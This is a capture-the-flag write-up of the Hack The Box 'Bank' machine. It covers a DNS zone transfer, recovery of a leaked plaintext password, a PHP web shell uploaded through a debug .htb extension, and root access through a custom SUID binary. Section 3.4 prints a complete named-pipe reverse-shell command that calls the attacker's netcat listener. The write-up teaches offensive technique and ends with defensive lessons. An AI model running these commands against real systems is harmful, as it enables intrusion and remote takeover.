# HTB: Bank

**Difficulty:** Easy
**OS:** Linux
**Target IP:** 10.129.29.200
**Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning
Started with a fast port sweep using `rustscan`, followed by a detailed service scan with `nmap`.

```bash
rustscan -a 10.129.29.200
```

```
Open 10.129.29.200:22
Open 10.129.29.200:53
Open 10.129.29.200:80
```

```bash
nmap -sCV -T4 -p22,53,80 10.129.29.200 -oA nmap/nmap
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Key takeaway: **DNS (port 53/tcp) running on a Linux box** stood out — normally associated with Windows AD, but here it's ISC BIND, which meant it was worth probing for zone data and virtual hosts rather than assuming AD.

### 2.1 Hostname Discovery

Reverse DNS lookup on the IP failed, so I guessed a domain based on the machine name and queried it directly:

```bash
nslookup
> SERVER 10.129.29.200
> bank.htb
```

```
Name:   bank.htb
Address: 10.129.29.200
```

Confirmed `bank.htb` resolves correctly on the target's own DNS server.

### 2.2 Zone Transfer

Since BIND was exposed, tested for a misconfigured zone transfer:

```bash
dig axfr bank.htb @10.129.29.200
```

```
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 6 604800 86400 2419200 604800
bank.htb.               604800  IN      NS      ns.bank.htb.
bank.htb.               604800  IN      A       10.129.29.200
ns.bank.htb.            604800  IN      A       10.129.29.200
www.bank.htb.           604800  IN      CNAME   bank.htb.
```

The zone transfer succeeded (misconfigured — should be restricted to authorized secondaries only) and disclosed a valid mailbox/admin identity in the SOA record: **`chris@bank.htb`**.

Added the target as a nameserver in `/etc/resolv.conf` so `bank.htb` and any subdomains would resolve locally for the rest of the assessment.

---

## 2. Web Enumeration

### 2.1 Directory Discovery

```bash
ffuf -u http://bank.htb/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
  -mc 200,301
```

```
uploads                 [Status: 301]
assets                  [Status: 301]
inc                     [Status: 301]
balance-transfer        [Status: 301]
```

### 2.2 Sensitive File Disclosure in `/balance-transfer`

Browsing `/balance-transfer` revealed a large number of files. Sorting by size, one file stood out as unusually small compared to the rest:

```bash
curl http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc
```

```
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```

An encryption failure on this particular transfer record caused it to be written to disk **in plaintext** instead of encrypted, exposing `chris`'s portal password directly. This lines up with the `chris@bank.htb` identity already recovered from the DNS zone transfer.

---

## 3. Exploitation — Foothold

### 3.1 Authenticated Access

Logged into the bank.htb web application with the harvested credentials (`chris@bank.htb` / `!##HTBB4nkP4ssw0rd!##`). Once authenticated, a **"Support"** section was available that included a file upload feature.

### 3.2 Bypassing the Upload Filter

Reviewing the page source on the support/upload form turned up a leftover developer comment:

```html
<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
```

This confirmed the application had a debug-only handler mapping `.htb` files to be executed as PHP — a backdoor left in from development that was never removed.

### 3.3 Uploading a Web Shell

Uploaded a PHP web shell renamed with the `.htb` extension (`shell.htb`) to bypass the intended upload filtering. Confirmed code execution:

```bash
curl "http://bank.htb/uploads/shell.htb?cmd=whoami"
```

```
www-data
```

### 3.4 Reverse Shell

Used the web shell to trigger a classic named-pipe reverse shell back to a Netcat listener:

```bash
curl "http://bank.htb/uploads/shell.htb?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.15.146%204444%20%3E%2Ftmp%2Ff"
```

```bash
nc -lvnp 4444
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.29.200] 36538
sh: 0: can't access tty; job control turned off
$
```

✅ Foothold obtained as `www-data`, and `user.txt` was retrieved from `chris`'s home directory.

---

## 4. Privilege Escalation

### 4.1 Hunting for SUID Binaries

```bash
find / -type f -user root -perm -4000 2>/dev/null
```

```
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
...
```

Most entries here are standard system SUID binaries. **`/var/htb/bin/emergency`** immediately stood out as non-standard — its path (`/var/htb/...`) and name suggest it was placed deliberately for this environment rather than being part of the base OS.

### 4.2 Abusing the Custom SUID Binary

```bash
ls -la /var/htb/bin/emergency
```

```
-rwsr-xr-x 1 root root 112204 Jun 14  2017 /var/htb/bin/emergency
```

```bash
file /var/htb/bin/emergency
```

```
/var/htb/bin/emergency: setuid ELF 32-bit LSB shared object, Intel 80386 ...
```

A root-owned SUID binary that `www-data` has execute permission on. Running it directly drops into a root shell — this appears to be an intentional "break-glass" emergency-access binary left behind without any authentication or restriction on who can invoke it:

```bash
/var/htb/bin/emergency
```

```
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
```

✅ Root access obtained.

---

## 5. Summary

| Stage | Technique |
|-------|-----------|
| Recon | `rustscan` + `nmap` → SSH, DNS (BIND), and Apache; DNS on a Linux host prompted zone-transfer testing |
| Domain/User discovery | Guessed and confirmed `bank.htb`; unrestricted `dig axfr` leaked `chris@bank.htb` from the SOA record |
| Enumeration | `ffuf` → discovered `/balance-transfer`; a failed-encryption `.acc` file leaked `chris`'s plaintext password |
| Foothold | Logged into the portal as `chris`; a leftover debug comment revealed `.htb` files execute as PHP, allowing an unrestricted web shell upload → RCE as `www-data` |
| Privilege Escalation | Located a non-standard, root-owned SUID binary (`/var/htb/bin/emergency`) with no access restriction — executing it returned a root shell directly |

**Root cause / lessons learned:**
- DNS zone transfers (`AXFR`) should be restricted to authorized secondary nameservers only; here it leaked an internal email/username with zero effort.
- Sensitive financial data should never fall back to writing plaintext to disk when encryption fails — the "encrypt failed" error should have blocked the write entirely rather than silently exposing credentials.
- Debug/development backdoors (like the `.htb`-as-PHP handler) must be removed before an application reaches anything resembling production, and file upload functionality should enforce a strict extension **and** content-type allowlist server-side.
- "Emergency access" or break-glass tooling should never be a bare SUID binary reachable by low-privileged accounts with no authentication, logging, or MFA gate — it defeats the purpose of privilege separation entirely.

---

## 6. Tools Used

- `rustscan`, `nmap` — reconnaissance
- `nslookup`, `dig` — DNS enumeration and zone transfer
- `ffuf` — content discovery
- `curl` — file retrieval and web shell interaction
- Custom PHP web shell (`.htb` extension) — initial code execution
- Named-pipe reverse shell (`mkfifo` + `nc`) — interactive foothold
- `find` (SUID hunting) — privilege escalation discovery
